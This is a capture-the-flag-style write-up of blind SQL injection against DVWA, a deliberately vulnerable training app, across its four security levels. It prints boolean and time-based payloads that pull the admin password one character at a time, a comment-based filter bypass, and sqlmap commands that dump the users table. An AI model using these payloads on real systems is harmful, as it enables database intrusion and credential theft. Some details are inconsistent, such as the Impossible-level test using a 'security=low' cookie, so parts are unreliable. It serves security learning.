# 🗂️ SQL_Injection (Blind) Writeup

## 📌 Description
Blind SQL Injection is a type of SQL Injection where the attacker cannot directly see query results in the application's response. Instead, the attacker infers information by observing differences in the application’s behavior, such as page content, HTTP status, or response time. 

## ⚙️ Lab Setup
- **Platform**: DVWA (Damn Vulnerable Web Application)
- **Target Page**: `/vulnerabilities/sql_injection(Blind)/`
- **Tested With**: Firefox, Burp Suite, Kali Linux,sqlmap( --wizard) 
- **Security Levels Tested**: Low, Medium, High, Impossible

- *Two techniques used:
  Boolen-based Blind - Infers results using true/false
  Time-based Blind   -Infers results bt delaying the response when a condition is true.

## 🔓 Low Security Level

### 🛠️ Exploitation Steps
Step 1 Boolen-based Blind Test

1 Inject this payloads and observe the differences in page 
-- http://.../sqli_blind/?id=1' AND 1=1 -- page load normally(TRUE condition) 
-- http://.../sqli_blind/?id=1' AND 1=2 -- FALSE condition
NB: There should be space after the comments --  

2 Extract first character of admin password (boolen)
Test if first character is greater than 'm' (char > 'm'):
1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1) > 'm' -- 

### ✅ Result

-- The 5 seconds delayed when the guessed character is correct, when you repeaet by changing the position of the substring 2,1 or 3,1 etc  you want to get the full password.

### 🔍 Weaknesses
-- Payloads are sent directly into an SQL query without sanitization, making Blind SQL Injection trivial.

### 🛡️ Mitigation Needed

-- Validate input (type checks for numeric parameters).
-- Hide errors.

## 🟡 Medium Security Level

### 🛠️ Exploitation Steps
1 Use cmment to bypass  filtering 
  1'/**/AND/**/'1'='1'--
Obsevation:
The keyword sleep must always be in bracket else it wont work thus sleep(5)


### ✅ Result
Keyword filtering can be bypassed with inline cooments or quotation excludding

### 🔍 Weaknesses
We don’t need the quotation here for the query to work since the source code didnot add quotation like 1’ AND sleep(5)—4&etc

## 🔴 High Security Level
1 Trigerr a time delay if condition is True:
1' AND IF(SUBSTRING((SELECT password FROM users WHERE user_id=1), 1, 1)='a', SLEEP(5), 0) --
2 Pay attension to response time -- If page is slow, the guessed letter is correct
3 Repeat for each character

### ✅ Result
Timming-based attacks can still leak data

Observation:
There is a random sleep in the in source code which can make it harder to make sure whether your condition works or not
It adds some level of prepared statements

### 🔍Impossible

### 🛠️ Exploitation Steps

observation:
Impossible level is fully secure — proper parameterized queries are used.
Manual injection fails, so we test with SQLMap.
-- sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=e7dddfec2fefe7d07dd9327930a19916" -D dvwa --tables this payload is used to find the number of tables in the database from the dvwa website

-- And this is used to find out the specific table like “user” sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=e7dddfec2fefe7d07dd9327930a19916" -D dvwa -T users

-- You can use the flag dump '--dump' to dump everything and hash the passwords for you thus:
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=e7dddfec2fefe7d07dd9327930a19916" -D dvwa -T users --dump
  
